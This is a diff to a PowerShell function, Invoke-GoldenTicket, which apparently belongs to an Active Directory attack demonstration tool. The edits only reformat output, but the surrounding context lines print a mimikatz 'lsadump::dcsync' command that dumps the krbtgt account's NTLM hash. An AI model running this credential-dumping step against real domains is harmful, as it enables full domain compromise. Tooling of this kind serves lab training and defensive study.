@@ -67,7 +67,7 @@ Function Invoke-GoldenTicket {
 
     If (-not $SkipClearHost) { Clear-Host }
 
-    Invoke-Output -T Header -M " Step 1 of 3 | Dump the NTLM Hash for the 'krbtgt' account"
+    Invoke-Output -Type  Header -M " Step 1 of 3 | Dump the NTLM Hash for the 'krbtgt' account"
     Invoke-Output -Type CodeSnippet -Message "Command:"
     Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log", """ ""lsadump::", "dcsync", " /domain:", $Script:ASFQDN, " /user:", $KrbtgtAccount, """ ""exit"""   `
         -Color $fgcC, $fgcS, $fgcV, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcS
@@ -150,7 +150,10 @@ Function Invoke-GoldenTicket {
         Write-Host ""  
         #Pause
         Set-NewColorSchema -NewStage $Script:GoldenTicket
-        klist
+        $tickets = Get-KlistTicket
+        $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
+        Invoke-Output -Type Info -Message "Last Ticket"
+        $tickets | Select-object -Last 1 | Format-List
         Write-Host ""
         Pause
             
